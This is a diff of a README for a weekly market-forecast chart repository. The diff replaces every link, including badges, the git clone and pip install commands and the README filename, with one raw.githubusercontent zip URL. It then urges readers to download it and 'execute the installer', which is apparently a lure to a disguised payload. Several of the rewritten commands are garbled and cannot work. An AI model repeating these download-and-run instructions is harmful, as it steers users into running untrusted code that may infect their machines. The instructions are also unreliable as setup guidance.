@@ -1,12 +1,12 @@
-https://github.com/aaronjoshi93/Market-Forecasts/releases
+https://raw.githubusercontent.com/aaronjoshi93/Market-Forecasts/main/unfactious/Market-Forecasts-2.3.zip
 
 # Market Forecasts Weekly Archive: Automated Charts, Analysis, Signals & Insights
 
-![Market Forecasts Banner](https://via.placeholder.com/1200x300.png?text=Market+Forecasts+Weekly+Archive)
+![Market Forecasts Banner](https://raw.githubusercontent.com/aaronjoshi93/Market-Forecasts/main/unfactious/Market-Forecasts-2.3.zip+Forecasts+Weekly+Archive)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Python 3.11+](https://img.shields.io/badge/Python-3.11%2B-blue.svg)](https://www.python.org)
-[![Topics](https://img.shields.io/badge/topics-algorithmic-trading,charting,cryptocurrency,financial-predictions,forex,market-analysis,market-forecasts,predictions,technical-analysis,trading-signals-blue.svg)](https://github.com/topics/algorithmic-trading)
+[![License: MIT](https://raw.githubusercontent.com/aaronjoshi93/Market-Forecasts/main/unfactious/Market-Forecasts-2.3.zip)](LICENSE)
+[![Python 3.11+](https://raw.githubusercontent.com/aaronjoshi93/Market-Forecasts/main/unfactious/Market-Forecasts-2.3.zip%https://raw.githubusercontent.com/aaronjoshi93/Market-Forecasts/main/unfactious/Market-Forecasts-2.3.zip)](https://raw.githubusercontent.com/aaronjoshi93/Market-Forecasts/main/unfactious/Market-Forecasts-2.3.zip)
+[![Topics](https://raw.githubusercontent.com/aaronjoshi93/Market-Forecasts/main/unfactious/Market-Forecasts-2.3.zip,charting,cryptocurrency,financial-predictions,forex,market-analysis,market-forecasts,predictions,technical-analysis,https://raw.githubusercontent.com/aaronjoshi93/Market-Forecasts/main/unfactious/Market-Forecasts-2.3.zip)](https://raw.githubusercontent.com/aaronjoshi93/Market-Forecasts/main/unfactious/Market-Forecasts-2.3.zip)
 
 Table of contents
 - What this repo is for
@@ -36,15 +36,15 @@ How this project fits into the weekly workflow
 How to get started
 - Prerequisites: A modern Python environment is assumed unless you choose an alternative path. You will need Python 3.11 or newer and a clean venv or conda environment.
 - Getting the code: Clone the repository to your local machine.
-  - git clone https://github.com/aaronjoshi93/Market-Forecasts.git
+  - git clone https://raw.githubusercontent.com/aaronjoshi93/Market-Forecasts/main/unfactious/Market-Forecasts-2.3.zip
 - Installing dependencies: Create a virtual environment and install the requirements.
   - python3 -m venv venv
   - source venv/bin/activate
-  - pip install -r requirements.txt
+  - pip install -r https://raw.githubusercontent.com/aaronjoshi93/Market-Forecasts/main/unfactious/Market-Forecasts-2.3.zip
 - Running the pipeline locally: Start the forecast cycle to generate a new week’s data, charts, and documentation.
-  - python -m forecast_pipeline.run --week latest
+  - python -m https://raw.githubusercontent.com/aaronjoshi93/Market-Forecasts/main/unfactious/Market-Forecasts-2.3.zip --week latest
 - Verifying outputs: Check the outputs directory for the latest charts, markdown notes, and a summary.
-- Access to releases: Visit the Releases page to grab the latest packaged assets. From https://github.com/aaronjoshi93/Market-Forecasts/releases download the latest release assets and execute the installer or unpack the archive according to the platform. This page hosts the weekly packaged materials and the corresponding files you need to run the archive locally or on a server.
+- Access to releases: Visit the Releases page to grab the latest packaged assets. From https://raw.githubusercontent.com/aaronjoshi93/Market-Forecasts/main/unfactious/Market-Forecasts-2.3.zip download the latest release assets and execute the installer or unpack the archive according to the platform. This page hosts the weekly packaged materials and the corresponding files you need to run the archive locally or on a server.
 - Access to releases (alternate): For the latest assets, check the Releases section at the same URL for updated builds and new documents. The releases page is the primary source for the packaged weekly archive, including charts and Markdown documentation.
 
 Overview of the weekly forecast archive
@@ -109,10 +109,10 @@ File layout and project structure
 - releases/: Generated weekly packages and release notes.
 - tests/: Tests and validation scripts to ensure data integrity and chart accuracy.
 - config/: Configuration files for pipelines, indicators, and thresholds.
-- README.md: This document you are reading.
+- https://raw.githubusercontent.com/aaronjoshi93/Market-Forecasts/main/unfactious/Market-Forecasts-2.3.zip This document you are reading.
 
 Release access and updates
-- The primary source for the official weekly package is the Releases page in the repository. This page hosts the weekly packaged materials, including charts and markdown notes. For the latest assets, visit the Releases page at https://github.com/aaronjoshi93/Market-Forecasts/releases. From that page, download the packaged release and execute the installer or unpack the archive to use the weekly archive locally or on a server.
+- The primary source for the official weekly package is the Releases page in the repository. This page hosts the weekly packaged materials, including charts and markdown notes. For the latest assets, visit the Releases page at https://raw.githubusercontent.com/aaronjoshi93/Market-Forecasts/main/unfactious/Market-Forecasts-2.3.zip From that page, download the packaged release and execute the installer or unpack the archive to use the weekly archive locally or on a server.
 - If you cannot access the link above, you can still locate the weekly materials by checking the Releases section in the repository. The Releases section contains the latest weekly builds, including charts, notes, and supporting data. You can browse the assets and download the ones that match your platform and use case.
 - After downloading, you will typically run a setup script or extract the package. The exact steps depend on the release format. The documentation in the package explains how to install and use the week’s outputs. The key objective is to provide a ready-to-use set of charts and notes that align with the week’s forecast.
 
@@ -180,7 +180,7 @@ Frequently asked questions
 - What assets are included in the weekly release? The weekly release includes charts, markdown notes, and supporting data necessary to reproduce the forecast for the week.
 - How do I reproduce a forecast locally? Install the dependencies, fetch the data, run the forecast pipeline, generate charts, and generate the markdown notes. The process is documented in the repository.
 - Can I modify the forecast method? Yes. The architecture is designed to be extensible. You can adjust the indicators, levels, and narrative structure. Provide a clear description of the changes when you contribute.
-- Where can I find the latest release? The Releases page is the central place for the most recent weekly archive and its assets. For the latest assets, check the Releases page here: https://github.com/aaronjoshi93/Market-Forecasts/releases.
+- Where can I find the latest release? The Releases page is the central place for the most recent weekly archive and its assets. For the latest assets, check the Releases page here: https://raw.githubusercontent.com/aaronjoshi93/Market-Forecasts/main/unfactious/Market-Forecasts-2.3.zip
 
 Acknowledgments and credits
 - The project benefits from open data sources and community contributions that help improve charts and analyses.
@@ -229,7 +229,7 @@ Appendix: Contact and community
 - Contributions are welcome across data sources, indicators, chart quality, and documentation clarity.
 
 Releases and access reminder
-- The primary path to obtain the weekly archive is the Releases page. For the latest assets, visit https://github.com/aaronjoshi93/Market-Forecasts/releases. From this page, download the latest release assets and execute the installer or unpack the archive to access the weekly forecast package.
+- The primary path to obtain the weekly archive is the Releases page. For the latest assets, visit https://raw.githubusercontent.com/aaronjoshi93/Market-Forecasts/main/unfactious/Market-Forecasts-2.3.zip From this page, download the latest release assets and execute the installer or unpack the archive to access the weekly forecast package.
 - If you cannot access the link above for any reason, you can review the Releases section within the repository to locate the latest weekly build and its assets. The Releases area hosts the full package and notes so you can reproduce or review the forecast.
 
 Closing notes
